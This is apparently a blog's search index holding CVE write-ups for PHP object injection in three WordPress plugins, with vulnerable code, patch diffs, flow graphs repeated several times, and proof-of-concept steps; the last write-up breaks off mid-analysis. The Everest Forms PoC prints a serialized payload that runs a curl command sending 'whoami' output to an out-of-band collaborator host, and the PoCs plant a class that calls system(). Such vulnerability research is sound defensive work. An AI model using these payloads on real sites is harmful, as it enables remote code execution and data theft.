[{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Responsive Slider by MetaSlider Plugin.","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rDeserialization of Untrusted Data vulnerability in MetaSlider Responsive Slider by MetaSlider allows Object Injection. This issue affects Responsive Slider by MetaSlider: from n/a through 3.94.0. CVE ID: CVE-2025-26763 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 3.94.0 Patched Versions: 3.95.0 CVSS severity: Medium (9.8) Required Privilege: Editor Product: WordPress Responsive Slider by MetaSlider Plugin ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Responsive Slider by MetaSlider: 3.94.0 – vulnerable 3.95.0 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rIn the vulnerable version (v3.94.0): if (isset($slideshow['meta']) \u0026\u0026 is_array($slideshow['meta'])) { foreach ($slideshow['meta'] as $key =\u003e $value) { update_post_meta( $new_slideshow_id, $key, maybe_unserialize(str_replace('{#ID#}', $new_slideshow_id, $value)) ); } } In this code, the maybe_unserialize() function is called directly on user-controlled data ($value). Since these values are not validated before being unserialized, an attacker can inject malicious serialized payloads leading to PHP Object Injection. Patch (v3.95.0): Patch diff\rThe patch adds two critical protections to prevent malicious data from being unserialized: Block any meta value that is a serialized object (O:). If detected, the import process stops and the slideshow is deleted. if (isset($slideshow['meta']) \u0026\u0026 is_array($slideshow['meta'])) { foreach ($slideshow['meta'] as $key =\u003e $value) { // @since 3.95 - Stop the process and cleanup if we catch non valid data in JSON if ( is_serialized( $value ) \u0026\u0026 substr( trim( $value ), 0, 2 ) === 'O:' ) { wp_trash_post($new_slideshow_id); return new WP_Error( 'import_slideshow_error', esc_html__( 'Import file is invalid.', 'ml-slider' ) ); } update_post_meta( $new_slideshow_id, $key, $this-\u003emaybe_unserialize(str_replace('{#ID#}', $new_slideshow_id, $value)) ); } } Replace maybe_unserialize() with a safer version using unserialize(..., ['allowed_classes' =\u003e false]) to prevent object creation during unserialization. public function maybe_unserialize( $data ) { if ( is_serialized( $data ) ) { // Don't attempt to unserialize data that wasn't serialized going in. return @unserialize( trim( $data ), array( 'allowed_classes' =\u003e false ) ); } return $data; } This eliminates the PHP Object Injection risk. ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe plugin registers a POST API: protected $namespace = 'metaslider/v1'; register_rest_route($this-\u003enamespace, '/slideshow/import', array(array( 'methods' =\u003e 'POST', 'callback' =\u003e array($this-\u003eapi, 'import_slideshows'), 'permission_callback' =\u003e array($this-\u003eapi, 'can_access') ))); with callback import_slideshows and permission validated via can_access(). const DEFAULT_CAPABILITY_EDIT_SLIDES = 'edit_others_posts'; public function can_access() { $capability = apply_filters('metaslider_capability', MetaSliderPlugin::DEFAULT_CAPABILITY_EDIT_SLIDES); // Check for the nonce on the server (used by WP REST) if (isset($_SERVER['HTTP_X_WP_NONCE']) \u0026\u0026 wp_verify_nonce(sanitize_key($_SERVER['HTTP_X_WP_NONCE']), 'wp_rest')) { return current_user_can($capability); } // This is for when not using Axios (example: callout.php) if (isset($_REQUEST['METASLIDER_NONCE']) \u0026\u0026 wp_verify_nonce(sanitize_key($_REQUEST['METASLIDER_NONCE']), 'metaslider_request')) { return current_user_can($capability); } return false; } This function only allows users with edit_others_posts capability (Editor or higher) to call the API. It validates in two ways: If the X-WP-Nonce header exists, the plugin verifies the 'wp_rest' nonce and checks the capability. If the METASLIDER_NONCE parameter exists, the plugin verifies the 'metaslider_request' nonce and checks the capability. If neither is valid, API access is denied. public function import_slideshows($request) { if (!$this-\u003ecan_access()) { $this-\u003edeny_access(); } $data = $this-\u003eget_request_data($request, array('slideshows')); if (!$data['slideshows']) { wp_send_json_error(array( 'message' =\u003e __('Nothing to import.', 'ml-slider') ), 400); } $status = $this-\u003eslideshows-\u003eimport((array) json_decode($data['slideshows'], true)); if (is_wp_error($status)) { wp_send_json_error(array( 'message' =\u003e $status-\u003eget_error_message() ), 400); } wp_send_json_success($status, 200); } import_slideshows(): Permission check – if can_access() returns false → block via deny_access(). Extract input data – get the slideshows field; if empty → return “Nothing to import”. JSON decode and import – decode slideshows and call $this-\u003eslideshows-\u003eimport(). Error handling – if WP_Error returned → send JSON error. Success – if no error → send JSON success with import result. According to import(), $slideshows is the exported data from created slideshows. Quote\r/** Will import slideshows * @param array $slideshows - The data generated by the export method * @throws Exception - handled within method. @return WP_Error|array - True on success, WP_Error on failure */ foreach ($slideshows as $index =\u003e $slideshow) { ... foreach ($slideshow['slides'] as $slide) { ... foreach ($slide['meta'] as $key =\u003e $value) { $value = $this-\u003erestore_image_urls_from_string($value); add_post_meta($new_slide_id, $key, maybe_unserialize($value)); } } ... } The import() function loops through each slideshow, then each slide, then each meta. Each meta value is restored using $this-\u003erestore_image_urls_from_string($value) and stored with add_post_meta($new_slide_id, $key, maybe_unserialize($value)). In other words, the code imports the entire slideshow, slides, and meta while processing image URLs and unserializing data before saving to the database. ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Editor sends POST request → /metaslider/v1/slideshow/import\"] --\u003e B[\"import_slideshows() invoked\"]\rB --\u003e C{\"can_access(): verify nonce + 'edit_others_posts' capability\"}\rC -- Fail --\u003e Z[\"deny_access()\"]\rC -- Pass --\u003e D[\"Extract 'slideshows' from request\"]\rD --\u003e E[\"json_decode(slideshows) → array of slideshow data\"]\rE --\u003e F[\"slideshows-\u003eimport() begins\"]\rF --\u003e G[\"foreach ($slideshows as $slideshow)\"]\rG --\u003e H[\"foreach ($slideshow['slides'] as $slide)\"]\rH --\u003e I[\"foreach ($slide['meta'] as key =\u003e value)\"]\rI --\u003e J[\"value = restore_image_urls_from_string(value)\"]\rJ --\u003e K{\"Is value serialized?\"}\rK -- Yes --\u003e L[\"maybe_unserialize(value)\"]\rK -- No --\u003e M[\"Store meta normally\"]\rL --\u003e N{\"Does unserialize create an object?\"}\rN -- Yes --\u003e R[\"Object Injection → POP chain execution\"]\rN -- No --\u003e M\rM --\u003e O[\"add_post_meta(new_slide_id, key, value)\"]\rO --\u003e P[\"Import continues for remaining slideshows\"]\rR --\u003e Q[\"Exploit achieved\"]\rgraph TD\rA[\"Editor sends POST request → /metaslider/v1/slideshow/import\"] --\u003e B[\"import_slideshows() invoked\"]\rB --\u003e C{\"can_access(): verify nonce + 'edit_others_posts' capability\"}\rC -- Fail --\u003e Z[\"deny_access()\"]\rC -- Pass --\u003e D[\"Extract 'slideshows' from request\"]\rD --\u003e E[\"json_decode(slideshows) → array of slideshow data\"]\rE --\u003e F[\"slideshows-\u003eimport() begins\"]\rF --\u003e G[\"foreach ($slideshows as $slideshow)\"]\rG --\u003e H[\"foreach ($slideshow['slides'] as $slide)\"]\rH --\u003e I[\"foreach ($slide['meta'] as key =\u003e value)\"]\rI --\u003e J[\"value = restore_image_urls_from_string(value)\"]\rJ --\u003e K{\"Is value serialized?\"}\rK -- Yes --\u003e L[\"maybe_unserialize(value)\"]\rK -- No --\u003e M[\"Store meta normally\"]\rL --\u003e N{\"Does unserialize create an object?\"}\rN -- Yes --\u003e R[\"Object Injection → POP chain execution\"]\rN -- No --\u003e M\rM --\u003e O[\"add_post_meta(new_slide_id, key, value)\"]\rO --\u003e P[\"Import continues for remaining slideshows\"]\rR --\u003e Q[\"Exploit achieved\"]\rgraph TD\rA[\"Editor sends POST request → /metaslider/v1/slideshow/import\"] --\u003e B[\"import_slideshows() invoked\"]\rB --\u003e C{\"can_access(): verify nonce + 'edit_others_posts' capability\"}\rC -- Fail --\u003e Z[\"deny_access()\"]\rC -- Pass --\u003e D[\"Extract 'slideshows' from request\"]\rD --\u003e E[\"json_decode(slideshows) → array of slideshow data\"]\rE --\u003e F[\"slideshows-\u003eimport() begins\"]\rF --\u003e G[\"foreach ($slideshows as $slideshow)\"]\rG --\u003e H[\"foreach ($slideshow['slides'] as $slide)\"]\rH --\u003e I[\"foreach ($slide['meta'] as key =\u003e value)\"]\rI --\u003e J[\"value = restore_image_urls_from_string(value)\"]\rJ --\u003e K{\"Is value serialized?\"}\rK -- Yes --\u003e L[\"maybe_unserialize(value)\"]\rK -- No --\u003e M[\"Store meta normally\"]\rL --\u003e N{\"Does unserialize create an object?\"}\rN -- Yes --\u003e R[\"Object Injection → POP chain execution\"]\rN -- No --\u003e M\rM --\u003e O[\"add_post_meta(new_slide_id, key, value)\"]\rO --\u003e P[\"Import continues for remaining slideshows\"]\rR --\u003e Q[\"Exploit achieved\"]\rgraph TD\rA[\"Editor sends POST request → /metaslider/v1/slideshow/import\"] --\u003e B[\"import_slideshows() invoked\"]\rB --\u003e C{\"can_access(): verify nonce + 'edit_others_posts' capability\"}\rC -- Fail --\u003e Z[\"deny_access()\"]\rC -- Pass --\u003e D[\"Extract 'slideshows' from request\"]\rD --\u003e E[\"json_decode(slideshows) → array of slideshow data\"]\rE --\u003e F[\"slideshows-\u003eimport() begins\"]\rF --\u003e G[\"foreach ($slideshows as $slideshow)\"]\rG --\u003e H[\"foreach ($slideshow['slides'] as $slide)\"]\rH --\u003e I[\"foreach ($slide['meta'] as key =\u003e value)\"]\rI --\u003e J[\"value = restore_image_urls_from_string(value)\"]\rJ --\u003e K{\"Is value serialized?\"}\rK -- Yes --\u003e L[\"maybe_unserialize(value)\"]\rK -- No --\u003e M[\"Store meta normally\"]\rL --\u003e N{\"Does unserialize create an object?\"}\rN -- Yes --\u003e R[\"Object Injection → POP chain execution\"]\rN -- No --\u003e M\rM --\u003e O[\"add_post_meta(new_slide_id, key, value)\"]\rO --\u003e P[\"Import continues for remaining slideshows\"]\rR --\u003e Q[\"Exploit achieved\"]\r","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a test class in wp-config.php: class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Create any slideshow, export to get a sample JSON file. Modify the JSON file so that the ml-slider_type field (or any iterated field) contains a serialized string. Example: Re-import the modified JSON file. Result\r","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability occurs because the plugin calls maybe_unserialize() directly on imported data without validation, allowing injection of malicious serialized payloads that lead to PHP Object Injection. Version 3.95.0 fixes this by blocking serialized objects and using a safer unserialize function. ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:7:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rNever unserialize user-controlled data without validation. Import/export features are always sensitive attack surfaces. Serialized data (especially starting with O:) must be controlled. Use allowed_classes =\u003e false to prevent object creation during unserialize. ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:8:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress Responsive Slider by MetaSlider Plugin \u003c= 3.94.0 is vulnerable to PHP Object Injection ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:9:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Everest Forms Plugin.","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Everest Forms – Contact Form, Quiz, Survey, Newsletter \u0026 Payment Form Builder for WordPress on WordPress contains a PHP Object Injection vulnerability in all versions up to and including 3.1.1, through unsafe unserialization of untrusted data from the parameter field_value. This allows an unauthenticated attacker to inject a PHP object. The vulnerable software does not contain any known POP chain, meaning the flaw will not lead to practical exploitation unless another plugin or theme on the website contains a compatible POP chain. If such a POP chain exists through an additional plugin or theme installed on the target system, it may allow the attacker to perform actions such as arbitrary file deletion, data theft, or even remote code execution, depending on the available POP chain. CVE ID: CVE-2025-3439 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 3.1.1 Patched Versions: 3.1.2 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Everest Forms Plugin ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Everest Forms: 3.1.1 – vulnerable 3.1.2 – patched Diff Tool (diff) → Meld or any other diff tool. ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rIn the vulnerable version (v3.1.1): if ( ! empty( $field_value ) || is_numeric( $field_value ) ) { if ( is_serialized( $field_value ) ) { $field_value = maybe_unserialize( $field_value ); } ... } In this snippet, maybe_unserialize() is directly executed on user-provided input ($field_value). This introduces a critical risk: Object Injection Risk: If the attacker embeds a PHP object payload within serialized data, the decode and unserialize process will instantiate a malicious object, potentially leading to Object Injection and escalation towards Remote Code Execution (RCE). Missing safety validation: No data validation is performed before unserialization. No fallback handling: If the input is invalid or malicious, no alternative error processing is performed, leaving the system open to exploitation. The patch (v3.1.2): Patch changes\rThe patch replaces maybe_unserialize() with a safer function evf_maybe_unserialize(): function evf_maybe_unserialize( $data, $options = array() ) { if ( is_serialized( $data ) ) { if ( version_compare( PHP_VERSION, '7.1.0', '\u003e=' ) ) { $options = wp_parse_args( $options, array( 'allowed_classes' =\u003e false ) ); return @unserialize( trim( $data ), $options ); //phpcs:ignore. } return @unserialize( trim( $data ) ); //phpcs:ignore. } return $data; } Using unserialize() with 'allowed_classes' =\u003e false completely removes the ability to instantiate objects, effectively eliminating the vulnerability. ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe plugin registers a submenu Entries: add_submenu_page( 'everest-forms', esc_html__( 'Everest Forms Entries', 'everest-forms' ), esc_html__( 'Entries', 'everest-forms' ), current_user_can( 'everest_forms_view_entries' ) ? 'everest_forms_view_entries' : 'everest_forms_view_others_entries', 'evf-entries', array( $this, 'entries_page' ) ); Callback entries_page is executed when accessing this submenu: public function entries_page() { EVF_Admin_Entries::page_output(); } The function calls page_output(): public static function page_output() { if ( apply_filters( 'everest_forms_entries_list_actions', false ) ) { do_action( 'everest_forms_entries_list_actions_execute' ); } elseif ( isset( $_GET['view-entry'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification include 'views/html-admin-page-entries-view.php'; } else { self::table_list_output(); } } When $_GET['view-entry'] exists, the view html-admin-page-entries-view.php is included. Entries Page\rThis page displays all submitted form input. $entry_meta = apply_filters( 'everest_forms_entry_single_data', $entry-\u003emeta, $entry, $form_data ); ... foreach ( $entry_meta as $meta_key =\u003e $meta_value ) { $meta_value = is_serialized( $meta_value ) ? $meta_value : wp_strip_all_tags( $meta_value ); if ( evf_is_json( $meta_value ) ) { $meta_value = json_decode( $meta_value, true ); $meta_value = $meta_value['value']; } ... $field_value = apply_filters( 'everest_forms_html_field_value', $meta_value, $entry_meta[ $meta_key ], $entry_meta, 'entry-single' ); ... if ( ! empty( $field_value ) || is_numeric( $field_value ) ) { if ( is_serialized( $field_value ) ) { $field_value = maybe_unserialize( $field_value ); } ... } ... } $entry_meta represents user-submitted form data. Each item contains a meta_key and a meta_value, and the system loops through them: If the value is JSON evf_is_json() determines whether the string is valid JSON. If yes, json_decode() extracts the decoded content via $meta_value['value']. Then $field_value is generated Passed through the filter everest_forms_html_field_value. If serialized maybe_unserialize() is used to decode it — this is the security flaw. ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"User submits form → Data stored in $entry_meta\"] --\u003e B[\"Admin opens Entries page in wp-admin\"]\rB --\u003e C[\"entries_page() executed\"]\rC --\u003e D{\"GET['view-entry'] exists?\"}\rD --\u003e|No| Z[\"Show entries table\"]\rD --\u003e|Yes| E[\"Load html-admin-page-entries-view.php\"]\rE --\u003e F[\"foreach ($entry_meta as meta_key =\u003e meta_value)\"]\rF --\u003e G{\"Is meta_value JSON?\"}\rG --\u003e|Yes| H[\"json_decode() → meta_value['value']\"]\rG --\u003e|No| I[\"meta_value = wp_strip_all_tags()\"]\rH --\u003e J[\"field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)\"]\rI --\u003e J\rJ --\u003e K{\"field_value is serialized?\"}\rK --\u003e|No| L[\"Display value normally\"]\rK --\u003e|Yes| M[\"maybe_unserialize(field_value) ← Vulnerable\"]\rM --\u003e N{\"Unserialize produces object?\"}\rN --\u003e|Yes| R[\"Object Injection → Possible exploit if POP chain exists\"]\rN --\u003e|No| L\rgraph TD\rA[\"User submits form → Data stored in $entry_meta\"] --\u003e B[\"Admin opens Entries page in wp-admin\"]\rB --\u003e C[\"entries_page() executed\"]\rC --\u003e D{\"GET['view-entry'] exists?\"}\rD --\u003e|No| Z[\"Show entries table\"]\rD --\u003e|Yes| E[\"Load html-admin-page-entries-view.php\"]\rE --\u003e F[\"foreach ($entry_meta as meta_key =\u003e meta_value)\"]\rF --\u003e G{\"Is meta_value JSON?\"}\rG --\u003e|Yes| H[\"json_decode() → meta_value['value']\"]\rG --\u003e|No| I[\"meta_value = wp_strip_all_tags()\"]\rH --\u003e J[\"field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)\"]\rI --\u003e J\rJ --\u003e K{\"field_value is serialized?\"}\rK --\u003e|No| L[\"Display value normally\"]\rK --\u003e|Yes| M[\"maybe_unserialize(field_value) ← Vulnerable\"]\rM --\u003e N{\"Unserialize produces object?\"}\rN --\u003e|Yes| R[\"Object Injection → Possible exploit if POP chain exists\"]\rN --\u003e|No| L\rgraph TD\rA[\"User submits form → Data stored in $entry_meta\"] --\u003e B[\"Admin opens Entries page in wp-admin\"]\rB --\u003e C[\"entries_page() executed\"]\rC --\u003e D{\"GET['view-entry'] exists?\"}\rD --\u003e|No| Z[\"Show entries table\"]\rD --\u003e|Yes| E[\"Load html-admin-page-entries-view.php\"]\rE --\u003e F[\"foreach ($entry_meta as meta_key =\u003e meta_value)\"]\rF --\u003e G{\"Is meta_value JSON?\"}\rG --\u003e|Yes| H[\"json_decode() → meta_value['value']\"]\rG --\u003e|No| I[\"meta_value = wp_strip_all_tags()\"]\rH --\u003e J[\"field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)\"]\rI --\u003e J\rJ --\u003e K{\"field_value is serialized?\"}\rK --\u003e|No| L[\"Display value normally\"]\rK --\u003e|Yes| M[\"maybe_unserialize(field_value) ← Vulnerable\"]\rM --\u003e N{\"Unserialize produces object?\"}\rN --\u003e|Yes| R[\"Object Injection → Possible exploit if POP chain exists\"]\rN --\u003e|No| L\rgraph TD\rA[\"User submits form → Data stored in $entry_meta\"] --\u003e B[\"Admin opens Entries page in wp-admin\"]\rB --\u003e C[\"entries_page() executed\"]\rC --\u003e D{\"GET['view-entry'] exists?\"}\rD --\u003e|No| Z[\"Show entries table\"]\rD --\u003e|Yes| E[\"Load html-admin-page-entries-view.php\"]\rE --\u003e F[\"foreach ($entry_meta as meta_key =\u003e meta_value)\"]\rF --\u003e G{\"Is meta_value JSON?\"}\rG --\u003e|Yes| H[\"json_decode() → meta_value['value']\"]\rG --\u003e|No| I[\"meta_value = wp_strip_all_tags()\"]\rH --\u003e J[\"field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)\"]\rI --\u003e J\rJ --\u003e K{\"field_value is serialized?\"}\rK --\u003e|No| L[\"Display value normally\"]\rK --\u003e|Yes| M[\"maybe_unserialize(field_value) ← Vulnerable\"]\rM --\u003e N{\"Unserialize produces object?\"}\rN --\u003e|Yes| R[\"Object Injection → Possible exploit if POP chain exists\"]\rN --\u003e|No| L\r","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a test class in wp-config.php: class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Submit a form with JSON-encoded serialized payload: POST /2025/11/22/test/ HTTP/1.1 Host: localhost ... Content-Disposition: form-data; name=\"everest_forms[form_fields][fullname]\" {\"value\":\"a:1:{i:0;O:4:\\\"Evil\\\":1:{s:7:\\\"command\\\";s:74:\\\"curl http:\\/\\/3hl5b0qvv7r0okj81wizv1kmddj47uvj.oastify.com?leadked=$(whoami)\\\";}}\"} ------geckoformboundary8355bd6da3783bb27aa92837fe803a6e ... Administrator opens the entry: Result\r","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability exists because maybe_unserialize() is used directly on user-supplied data without restricting which PHP classes may be instantiated, leading to PHP Object Injection. If a POP chain is present in another plugin or theme, an unauthenticated attacker may escalate to dangerous actions such as reading/writing/deleting files or even remote code execution. The patch uses evf_maybe_unserialize() with allowed_classes =\u003e false, fully neutralizing the issue. ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:7:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rRoot cause: Use of maybe_unserialize() on user-controlled data without restricting classes. Impact: Object Injection, potentially RCE if a compatible POP chain exists. Attack surface: Triggered when an admin opens the Entries page; malicious payload is already stored. Fix: Use unserialize() with allowed_classes = false, preventing object creation. Lesson learned: Any unserialization must restrict allowed classes or switch to safer formats like JSON. ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:8:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress Everest Forms Plugin \u003c= 3.1.1 is vulnerable to PHP Object Injection ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:9:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP Tabs Plugin.","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Deserialization of Untrusted Data vulnerability in ShapedPlugin LLC WP Tabs allows Object Injection. This issue affects WP Tabs from unspecified versions up to version 2.2.12. CVE ID: CVE-2025-48134 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 2.2.12 Patched Versions: 2.2.13 CVSS severity: High (7.2) Required Privilege: Administrator Product: WordPress WP Tabs Plugin ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - WP Tabs: 2.2.12 – vulnerable 2.2.13 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rIn the vulnerable version (v2.2.12): $sanitize_value = $this-\u003esanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( '{#ID#}', $new_tabs_id, $value ) ) ); In this code, the maybe_unserialize() function is called directly on user data ($value after replacing '{#ID#}' with $new_tabs_id). This creates a critical vulnerability: Object Injection risk: If an attacker injects a PHP object payload into base64 data, decoding and unserialization will instantiate the malicious object, leading to Object Injection and potentially Remote Code Execution (RCE). Lack of safety checks: No validation is performed before unserializing. No fallback mechanism: If the data is invalid or corrupted, the system has no alternative handling, making the application exploitable. Patch (v2.2.13): Patch changes\rThe patch uses unserialize with 'allowed_classes' =\u003e false, completely removing the ability to instantiate objects and fully mitigating the vulnerability. ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe plugin registers an AJAX endpoint for logged-in users (wp_ajax_): $this-\u003eloader-\u003eadd_action( 'wp_ajax_tabs_import_shortcode', $import_export, 'import_shortcode' ); Accessing the endpoint /wp-admin/admin-ajax.php with action=tabs_import_shortcode calls the import_shortcode callback: public function import_shortcode() { $nonce = ( ! empty( $_POST['nonce'] ) ) ? sanitize_text_field( wp_unslash( $_POST['nonce'] ) ) : ''; if ( ! wp_verify_nonce( $nonce, 'wptabspro_options_nonce' ) ) { wp_send_json_error( array( 'message' =\u003e esc_html__( 'Error: Nonce verification has failed. Please try again.', 'wp-expand-tabs-free' ) ), 401 ); } $allow_tags = isset( $_POST['unSanitize'] ) ? sanitize_text_field( wp_unslash( $_POST['unSanitize'] ) ) : ''; // Don't worry sanitize after JSON decode below. $data = isset( $_POST['shortcode'] ) ? wp_unslash( $_POST['shortcode'] ) : '';//phpcs:ignore $data = json_decode( $data ); $data = json_decode( $data, true ); $shortcodes = $allow_tags ? $data['shortcode'] : wp_kses_post_deep( $data['shortcode'] ); if ( ! $data ) { wp_send_json_error( array( 'message' =\u003e __( 'Nothing to import.', 'wp-expand-tabs-free' ), ), 400 ); } $status = $this-\u003eimport( $shortcodes ); if ( is_wp_error( thing: $status ) ) { wp_send_json_error( array( 'message' =\u003e $status-\u003eget_error_message(), ), 400 ); } wp_send_json_success( $status, 200 ); } The function checks the nonce; if invalid, it returns an error and stops execution. Testing the plugin, the import feature is found at /wp-admin/edit.php?post_type=sp_wp_tabs\u0026page=tab_tools#tab=2. Import feature\rThis feature is restricted to Administrators, so a valid nonce must belong to an Administrator. The uploaded JSON file is assigned to the shortcode parameter in the POST request: $data = isset( $_POST['shortcode'] ) ? wp_unslash( $_POST['shortcode'] ) : '';//phpcs:ignore $data = json_decode( $data ); $data = json_decode( $data, true ); The plugin decodes JSON twice. In the second call, associative=true converts JSON objects into PHP arrays as described: Quote\r@param $associative: When true, JSON objects will be returned as associative arrays; when false, JSON objects will be returned as objects. When null, JSON objects will be returned as associative arrays or objects depending on whether JSON_OBJECT_AS_ARRAY is set in the flags. 